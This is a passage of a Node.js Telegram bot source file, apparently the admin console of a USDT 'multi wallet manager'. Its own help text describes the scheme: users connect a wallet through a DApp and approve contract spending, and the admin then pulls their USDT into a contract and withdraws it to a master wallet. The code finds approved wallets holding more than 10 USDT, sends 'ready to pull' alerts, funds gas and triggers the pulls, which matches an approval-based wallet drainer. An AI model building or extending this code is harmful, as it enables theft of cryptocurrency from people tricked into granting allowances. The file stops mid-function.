const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const { ethers } = require('ethers');
const database = require('./database');
const path = require('path');
const fs = require('fs');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
        this.provider = null;
        this.contract = null;
        this.contractABI = null;
        this.masterWallet = process.env.MASTER_WALLET_ADDRESS ||
            (process.env.MASTER_WALLET_PRIVATE_KEY
                ? new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY).address
                : '0xMasterWalletAddress');

        // Load contract ABI
        this.loadContractABI();
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths
            const possiblePaths = [
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json')
            ];

            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }

            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error && error.message ? error.message : error);
            this.contractABI = [];
        }
    }

    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }

        try {
            // Create bot instance - we'll handle updates manually
            this.bot = new TelegramBot(this.botToken, { polling: false });

            // Initialize blockchain provider if environment variables are set
            this.initBlockchain();

            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;

            console.log('✅ Telegram bot initialized (manual update mode)');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error && error.message ? error.message : error);
        }
    }

    // Initialize blockchain provider and contract when needed
    initBlockchain() {
        if (process.env.RPC_URL && process.env.CONTRACT_ADDRESS && this.contractABI && this.contractABI.length > 0) {
            try {
                this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
                console.log('✅ Blockchain provider initialized');

                // Initialize contract with signer if master private key exists
                if (process.env.MASTER_WALLET_PRIVATE_KEY) {
                    const wallet = new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY, this.provider);
                    this.contract = new ethers.Contract(
                        process.env.CONTRACT_ADDRESS,
                        this.contractABI,
                        wallet
                    );
                    console.log('✅ Smart contract initialized with signer');
                } else {
                    this.contract = new ethers.Contract(
                        process.env.CONTRACT_ADDRESS,
                        this.contractABI,
                        this.provider
                    );
                    console.log('✅ Smart contract initialized (read-only)');
                }
            } catch (error) {
                console.error('❌ Blockchain initialization failed:', error && error.message ? error.message : error);
                this.provider = null;
                this.contract = null;
            }
        } else {
            console.log('⚠️ Blockchain configuration incomplete');
            if (!process.env.RPC_URL) console.log('   - RPC_URL not set');
            if (!process.env.CONTRACT_ADDRESS) console.log('   - CONTRACT_ADDRESS not set');
            if (!this.contractABI || this.contractABI.length === 0) console.log('   - Contract ABI not loaded');
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendHelpMenu(msg.chat.id);
        });

        // Menu command (floating menu)
        this.bot.onText(/\/menu/, (msg) => {
            console.log('Received /menu command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match && match[1] ? match[1] : null;
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            console.log('Received /withdraw command from chat:', msg.chat.id);
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            console.log('Received /balances command from chat:', msg.chat.id);
            this.handleBalancesCommand(msg.chat.id);
        });

        // Button callbacks
        this.bot.on('callback_query', async (callbackQuery) => {
            const action = callbackQuery && callbackQuery.data ? callbackQuery.data : null;
            const chatId = callbackQuery && callbackQuery.message && callbackQuery.message.chat ? callbackQuery.message.chat.id : null;

            if (!action || !chatId) {
                console.warn('Malformed callback_query received.');
                return;
            }

            console.log('Received callback query:', action, 'from chat:', chatId);

            // Answer the callback query to remove loading state
            try {
                await this.bot.answerCallbackQuery(callbackQuery.id);
            } catch (error) {
                console.error('Error answering callback query:', error && error.message ? error.message : error);
            }

            // Handle different actions
            if (action === 'withdraw') {
                this.handleWithdrawCommand(chatId);
            } else if (action === 'balances') {
                this.handleBalancesCommand(chatId);
            } else if (action === 'pull_list') {
                await this.sendPullWalletList(chatId); // Fixed: Added await
            } else if (action === 'help') {
                this.sendHelpMenu(chatId);
            } else if (action === 'menu') {
                this.sendMainMenu(chatId);
            } else if (action.startsWith('pull_')) {
                const walletAddress = action.substring(5);
                this.handlePullCommand(chatId, walletAddress);
            }
        });
    }

    // escape HTML special characters
    escapeHtml(text) {
        if (!text && text !== 0) return '';
        
        // Convert to string first
        let result = String(text);
        
        // Escape HTML special characters
        result = result.replace(/&/g, '&amp;')
                      .replace(/</g, '&lt;')
                      .replace(/>/g, '&gt;')
                      .replace(/"/g, '&quot;')
                      .replace(/'/g, '&#039;');
        
        return result;
    }

    // Mask address for security
    maskAddress(address) {
        if (!address || typeof address !== 'string') return 'Invalid Address';
        if (address.length < 10) return address;
        return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    }

    async sendMainMenu(chatId) {
        const message = `
🤖 Multi Wallet Manager - Main Menu

Welcome to your USDT management system. Select an option below:

💰 Wallet Operations
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 Security
• Only authorized admins can perform operations
• All transactions are logged and tracked
        `;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '📊 Balances', callback_data: 'balances' },
                        { text: '❓ Help', callback_data: 'help' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Main menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending main menu to chat', chatId, ':', error && error.message ? error.message : error);
            // Fallback without HTML
            const fallbackMessage = `
🤖 Multi Wallet Manager - Main Menu

Welcome to your USDT management system. Select an option below:

💰 Wallet Operations
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 Security
• Only authorized admins can perform operations
• All transactions are logged and tracked
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '📊 Balances', callback_data: 'balances' },
                            { text: '❓ Help', callback_data: 'help' }
                        ]
                    ]
                }
            });
        }
    }

    async sendHelpMenu(chatId) {
        const message = `
🤖 Multi Wallet Manager - Help

📚 Available Commands:
• /start - Open main menu
• /menu - Show floating menu
• /pull_<address> - Pull USDT from specific wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all balances
• /help - Show this help message

📋 Available Operations:
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto-gas management for transactions
• 6-hour balance monitoring

🛡️ Security Features:
• Admin-only operations
• Gas paid by master wallet
• Transaction logging

🔄 Workflow:
1. Connect wallet via DApp
2. Approve contract spending
3. Admin pulls USDT to contract
4. Admin withdraws to master wallet
        `;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Help menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending help menu to chat', chatId, ':', error && error.message ? error.message : error);
            const fallbackMessage = `
🤖 Multi Wallet Manager - Help

📚 Available Commands:
• /start - Open main menu
• /menu - Show floating menu
• /pull_<address> - Pull USDT from specific wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all balances
• /help - Show this help message
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

   async sendWalletReadyAlert(walletAddress, balance) {
    if (!this.bot || !this.adminChatId) {
        console.log('Telegram bot not ready for sending alerts');
        return;
    }

    const maskedAddress = this.maskAddress(walletAddress);
    const escapedBalance = this.escapeHtml(balance);

    const message = `
🔔 WALLET READY TO PULL
Address: ${maskedAddress}
USDT Balance: ${escapedBalance} USDT

Actions:
    `;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📤 PULL USDT', callback_data: `pull_${walletAddress}` }
                ],
                [
                    { text: '🏠 Main Menu', callback_data: 'menu' }
                ]
            ]
        }
    };

    try {
        const result = await this.bot.sendMessage(this.adminChatId, message, options);
        console.log('Wallet ready alert sent to admin chat');
        return result;
    } catch (error) {
        console.error('Error sending wallet ready alert:', error && error.message ? error.message : error);
        const fallbackMessage = `
🔔 WALLET READY TO PULL
Address: ${maskedAddress}
USDT Balance: ${escapedBalance} USDT

Actions:
        `;
        return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 PULL USDT', callback_data: `pull_${walletAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        });
    }
}
    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;

        const maskedAddress = this.maskAddress(walletAddress);
        const escapedBalance = this.escapeHtml(balance);

        const message = `
💰 BALANCE ALERT
Address: ${maskedAddress}
USDT Balance: ${escapedBalance} USDT (> $10)

Actions:
        `;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending balance alert:', error && error.message ? error.message : error);
            const fallbackMessage = `
💰 BALANCE ALERT
Address: ${maskedAddress}
USDT Balance: ${escapedBalance} USDT (> $10)

Actions:
        `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;

        const maskedAddress = this.maskAddress(walletAddress);
        const escapedAmount = this.escapeHtml(amount);
        const maskedTxHash = this.maskAddress(txHash);

        const message = `
✅ SUCCESSFUL PULL
Address: ${maskedAddress}
Amount: ${escapedAmount} USDT
Transaction: ${maskedTxHash}

Next steps:
        `;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending success message:', error && error.message ? error.message : error);
            const fallbackMessage = `
✅ SUCCESSFUL PULL
Address: ${maskedAddress}
Amount: ${amount} USDT
Transaction: ${maskedTxHash}

Next steps:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    // ENHANCED Pull Wallet List with real-time balances
    async sendPullWalletList(chatId) {
    if (chatId.toString() !== this.adminChatId) {
        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
    }

    try {
        // Show processing message
        const processingMessage = '🔄 Fetching wallet balances...';
        const processingOptions = {};
        
        // Send initial processing message
        const processingMsg = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
        
        console.log('Fetching all wallets from database...');
        
        // Fetch ALL wallets from database first
        const allWalletsQuery = 'SELECT address, name, usdt_balance, created_at FROM wallets ORDER BY created_at DESC';
        const allWalletsResult = await database.query(allWalletsQuery);
        
        const totalWallets = allWalletsResult.rows.length;
        let walletsToUpdate = [];
        
        // Fetch real-time balances for all wallets and check approval status
        const contractService = require('../services/contract.service');
        
        // Update balances for all wallets
        for (const wallet of allWalletsResult.rows) {
            try {
                console.log(`Fetching real-time balance for: ${wallet.address}`);
                const realTimeBalance = await contractService.getWalletUSDTBalance(wallet.address);
                console.log(`Real-time balance for ${wallet.address}: ${realTimeBalance}`);
                
                // Update database with real-time balance
                const updateQuery = `
                    UPDATE wallets 
                    SET usdt_balance = $1, last_balance_check = NOW(), updated_at = NOW()
                    WHERE address = $2
                `;
                await database.query(updateQuery, [realTimeBalance, wallet.address]);
                
                // Update the wallet object with real-time balance
                wallet.usdt_balance = realTimeBalance;
                
                // Add to walletsToUpdate if balance > 10 AND wallet has approved spending
                if (parseFloat(realTimeBalance) > 10) {
                    // Check if wallet has approved spending
                    const hasApprovedSpending = await this.checkWalletApproval(wallet.address);
                    if (hasApprovedSpending) {
                        walletsToUpdate.push(wallet);
                        console.log(`Wallet ${wallet.address} added to pull list (balance: ${realTimeBalance}, approved: true)`);
                    } else {
                        console.log(`Wallet ${wallet.address} has balance ${realTimeBalance} but not approved - excluded from pull list`);
                    }
                }
            } catch (error) {
                console.error(`Error fetching balance for ${wallet.address}:`, error.message);
                // Keep existing balance if fetch fails
                if (parseFloat(wallet.usdt_balance || '0') > 10) {
                    // Check if wallet has approved spending
                    const hasApprovedSpending = await this.checkWalletApproval(wallet.address);
                    if (hasApprovedSpending) {
                        walletsToUpdate.push(wallet);
                    }
                }
            }
        }
        
        const walletsOver10 = walletsToUpdate.length;
        
        let message = `📤 Select Wallet to Pull\n\n`;
        message += `Total Wallets Connected: ${totalWallets}\n`;
        message += `Wallets with >10 USDT: ${walletsOver10}\n\n`;

        if (walletsToUpdate.length === 0) {
            message += 'No wallets with balance > 10 USDT found.\n\n';
            message += 'New wallets will be checked automatically.';
        } else {
            message += 'Click on a wallet to pull USDT:\n\n';
            for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
                const wallet = walletsToUpdate[i];
                const maskedAddress = this.maskAddress(wallet.address);
                // Format balance to 2 decimal places
                const balance = parseFloat(wallet.usdt_balance || '0').toFixed(2);
                message += `${i + 1}. ${maskedAddress} (${balance} USDT)\n`;
            }
        }

        // Build inline keyboard
        const inlineKeyboard = [];
        
        // Add wallet buttons (only for wallets with balance > 10 AND approved spending)
        if (walletsToUpdate.length > 0) {
            for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
                const wallet = walletsToUpdate[i];
                inlineKeyboard.push([{
                    text: `📤 Pull ${wallet.name || `Wallet ${i + 1}`}`,
                    callback_data: `pull_${wallet.address}`
                }]);
            }
        }
        
        // Add the main menu button
        inlineKeyboard.push([
            { text: '🏠 Main Menu', callback_data: 'menu' }
        ]);

        const options = {
            reply_markup: {
                inline_keyboard: inlineKeyboard
            }
        };

        // Edit the processing message with the actual results
        return await this.bot.editMessageText(message, {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            ...options
        });
        
    } catch (error) {
        console.error('Error sending pull wallet list:', error && error.message ? error.message : error);
        const fallbackMessage = `
❌ Error fetching wallet list. Please try again later.
        `;
        return await this.bot.sendMessage(chatId, fallbackMessage, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        });
    }
}

// Check if wallet has approved USDT spending by checking allowance
async checkWalletApproval(walletAddress) {
    try {
        // Check if we have the necessary contract addresses and provider
        const usdtContractAddress = process.env.USDT_CONTRACT_ADDRESS;
        const contractAddress = process.env.CONTRACT_ADDRESS;
        
        if (!usdtContractAddress || !contractAddress || !this.provider) {
            console.error('Missing contract addresses or provider for approval check');
            return false;
        }
        
        // Create USDT contract instance
        const usdtContract = new ethers.Contract(
            usdtContractAddress,
            ['function allowance(address owner, address spender) external view returns (uint256)'],
            this.provider
        );
        
        // Check allowance
        const allowance = await usdtContract.allowance(walletAddress, contractAddress);
        
        // If allowance is greater than 0, wallet has approved spending
        const hasApproved = allowance > 0n; // Using BigInt comparison
        console.log(`Wallet ${walletAddress} allowance: ${allowance.toString()}, approved: ${hasApproved}`);
        
        return hasApproved;
    } catch (error) {
        console.error(`Error checking approval for wallet ${walletAddress}:`, error.message);
        // In case of error, we assume the wallet is not approved for safety
        return false;
    }
}
    // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
    async getContractUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS) {
            console.log("⚠️ Blockchain not ready, returning zero USDT balance");
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }

        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );

            const balance = await usdtContract.balanceOf(process.env.CONTRACT_ADDRESS);
            const formattedBalance = ethers.formatUnits(balance, 18);

            console.log('Contract USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error(
                'Error getting contract USDT balance:',
                error && error.message ? error.message : error
            );

            return {
                balance: '0.00',
                error: error && error.message ? error.message : String(error)
            };
        }
    }

    async getMasterWalletBNBBalance() {
        if (!this.provider || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }

        try {
            const balance = await this.provider.getBalance(this.masterWallet);
            const formattedBalance = ethers.formatEther(balance);

            console.log('Master Wallet BNB Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet BNB balance:', error && error.message ? error.message : error);
            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
        }
    }

    async getMasterWalletUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }

        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );

            const balance = await usdtContract.balanceOf(this.masterWallet);
            const formattedBalance = ethers.formatUnits(balance, 18);

            console.log('Master Wallet USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet USDT balance:', error && error.message ? error.message : error);
            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }

        const maskedAddress = this.maskAddress(walletAddress);
        const fullAddress = walletAddress; // Full address for display

        const message = `
🔄 Pull Operation Initiated
Wallet: ${fullAddress}
Masked: ${maskedAddress}

Processing... This will:
1. Check wallet gas balance
2. Send gas if needed
3. Pull USDT to contract
4. Send confirmation

⏳ Please wait...
        `;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, message, options);

            // Import gas service and contract service (defensive require)
            let gasService;
            let contractService;
            try {
                gasService = require('../services/gas.service');
            } catch (e) {
                console.warn('gas.service not found:', e && e.message ? e.message : e);
            }
            try {
                contractService = require('../services/contract.service');
            } catch (e) {
                console.warn('contract.service not found:', e && e.message ? e.message : e);
            }

            // If services missing, notify and return
            if (!contractService) {
                await this.bot.sendMessage(chatId, `❌ Contract service not available. Can't pull now.`);
                return result;
            }

            // Check gas balance (if gasService exists)
            if (gasService && typeof gasService.checkWalletGasBalance === 'function') {
                const gasCheck = await gasService.checkWalletGasBalance(walletAddress);

                if (!gasCheck || !gasCheck.hasSufficientGas) {
                                        if (gasService && typeof gasService.sendGasToWallet === 'function') {
                        const gasResult = await gasService.sendGasToWallet(walletAddress);
                        if (!gasResult || !gasResult.success) {
                            const errorMessage = `
❌ GAS FAILED
Wallet: ${fullAddress}
Error: ${this.escapeHtml((gasResult && gasResult.error) ? gasResult.error : 'Unknown error')}

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                            `;
                            await this.bot.sendMessage(chatId, errorMessage, {
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: '📊 Check Balances', callback_data: 'balances' },
                                            { text: '🏠 Main Menu', callback_data: 'menu' }
                                        ]
                                    ]
                                }
                            });
                            return result;
                        }
                    }
                }
            }

            // Pull USDT from wallet to contract - USE CORRECT METHOD NAME
            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);

            if (pullResult && pullResult.success) {
                const escapedAmount = this.escapeHtml(pullResult.amount || '0');
                const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
                const fullTxHash = pullResult.txHash || 'N/A';
                const escapedTxHash = this.escapeHtml(maskedTxHash);
                const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

                const successMessage = `
✅ PULL SUCCESSFUL
Wallet: ${fullAddress}
Amount: ${escapedAmount} USDT
Transaction: ${fullTxHash}

📊 Updated Balances:
• Check balances for update

🔄 Last Updated: ${escapedTimestamp}
                `;

                await this.bot.sendMessage(chatId, successMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                            ],
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });

                // Update database
                try {
                    const updateQuery = `
                        UPDATE wallets 
                        SET usdt_balance = 0, updated_at = NOW()
                        WHERE address = $1
                    `;
                    await database.query(updateQuery, [walletAddress]);
                } catch (dbError) {
                    console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
                }
            } else {
                const errorMessage = `
❌ PULL FAILED
Wallet: ${fullAddress}
Error: ${this.escapeHtml((pullResult && pullResult.error) ? pullResult.error : 'Unknown error')}

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                `;
                await this.bot.sendMessage(chatId, errorMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            return result;
        } catch (error) {
            console.error('Error in pull command:', error && error.message ? error.message : error);

            const errorMessage = `
❌ PULL FAILED
Wallet: ${fullAddress}
Error: ${this.escapeHtml(error && error.message ? error.message : String(error))}

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
            `;

            try {
                await this.bot.sendMessage(chatId, errorMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } catch (e) {
                console.error('Failed to send error message to chat:', e && e.message ? e.message : e);
            }

            return this.bot.sendMessage(chatId, `❌ Error: ${error && error.message ? error.message : String(error)}`);
        }
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        const processingMessage = `
🏦 Withdraw Operation Initiated
Withdrawing all USDT from contract to master wallet...

📋 Operations to perform:
• Check contract USDT balance
• Execute withdrawal transaction
• Send confirmation

⏳ Please wait...
        `;

        const processingOptions = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);

            // Import the contract service
            let contractService;
            try {
                contractService = require('../services/contract.service');
            } catch (e) {
                console.warn('contract.service not found:', e && e.message ? e.message : e);
            }

            if (!contractService || typeof contractService.withdrawUSDTToMaster !== 'function') {
                await this.bot.sendMessage(chatId, '❌ Withdrawal service unavailable.');
                return result;
            }

            // Execute the actual withdrawal with timeout
            const withdrawPromise = contractService.withdrawUSDTToMaster();
            const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve({ success: false, error: 'Operation timeout after 45 seconds' }), 45000));

            const withdrawResult = await Promise.race([withdrawPromise, timeoutPromise]);

            if (withdrawResult && withdrawResult.success) {
                // Escape all values
                const maskedMasterWallet = this.maskAddress(this.masterWallet);
                const escapedMasterWallet = this.escapeHtml(maskedMasterWallet);
                const escapedAmount = this.escapeHtml(withdrawResult.amount || '0');
                const maskedTxHash = this.maskAddress(withdrawResult.txHash || 'N/A');
                const fullTxHash = withdrawResult.txHash || 'N/A';
                const escapedTxHash = this.escapeHtml(maskedTxHash);
                const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

                const successMessage = `
✅ WITHDRAWAL SUCCESSFUL
Amount: ${escapedAmount} USDT
To: ${escapedMasterWallet}
Transaction: ${fullTxHash}

📊 Updated Balances:
• Contract USDT: 0.00 USDT
• Master Wallet USDT: Check balances for update

🔄 Last Updated: ${escapedTimestamp}
                `;

                await this.bot.sendMessage(chatId, successMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } else {
                // Escape error message
                const escapedError = this.escapeHtml((withdrawResult && withdrawResult.error) ? withdrawResult.error : 'Unknown error occurred');
                const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

                const errorMessage = `
❌ WITHDRAWAL FAILED
Error: ${escapedError}

🔄 Last Updated: ${escapedTimestamp}
                `;
                
                await this.bot.sendMessage(chatId, errorMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            return result;
        } catch (error) {
            console.error('Error in withdraw command:', error && error.message ? error.message : error);

            // Escape error message
            const cleanErrorMessage = error && error.message
                ? error.message.replace(/[^a-zA-Z0-9\s.\,!\?-]/g, '').substring(0, 200)
                : 'Unknown error occurred';
            const escapedErrorMessage = this.escapeHtml(cleanErrorMessage);
            const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

            const errorMessage = `
❌ WITHDRAWAL FAILED
Error: ${escapedErrorMessage}

🔄 Last Updated: ${escapedTimestamp}
            `;

            try {
                await this.bot.sendMessage(chatId, errorMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } catch (e) {
                console.error('Failed to send withdraw error message:', e && e.message ? e.message : e);
            }

            return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
        }
    }

    async handleBalancesCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        const processingMessage = `
📊 Fetching Real Balances

📋 Balance Checks:
• Smart Contract USDT Balance
• Master Wallet BNB Balance
• Master Wallet USDT Balance

⏳ Querying blockchain...
        `;

        const processingOptions = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);

            // Fetch real balances with timeout - USE CORRECT METHOD NAMES
            const contractBalancePromise = this.getContractUSDTBalance();
            const masterBNBBalancePromise = this.getMasterWalletBNBBalance();
            const masterUSDTBalancePromise = this.getMasterWalletUSDTBalance();

            // Add timeout wrapper
            const timeoutWrapper = (promise, ms) => {
                return Promise.race([
                    promise,
                    new Promise((resolve) => setTimeout(() => resolve({ balance: '0', error: 'Timeout' }), ms))
                ]);
            };

            const contractBalance = await timeoutWrapper(contractBalancePromise, 15000);
            const masterBNBBalance = await timeoutWrapper(masterBNBBalancePromise, 15000);
            const masterUSDTBalance = await timeoutWrapper(masterUSDTBalancePromise, 15000);

            // Format the real balances message
            const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
            const maskedContractAddress = this.maskAddress(contractAddress);
            const maskedMasterWallet = this.maskAddress(this.masterWallet);

            // Escape everything
            const escapedContractAddress = this.escapeHtml(maskedContractAddress);
            const escapedMasterWallet = this.escapeHtml(maskedMasterWallet);
            const escapedContractBalance = this.escapeHtml(contractBalance && contractBalance.balance ? contractBalance.balance : '0');
            const escapedBNBBalance = this.escapeHtml(masterBNBBalance && masterBNBBalance.balance ? masterBNBBalance.balance : '0');
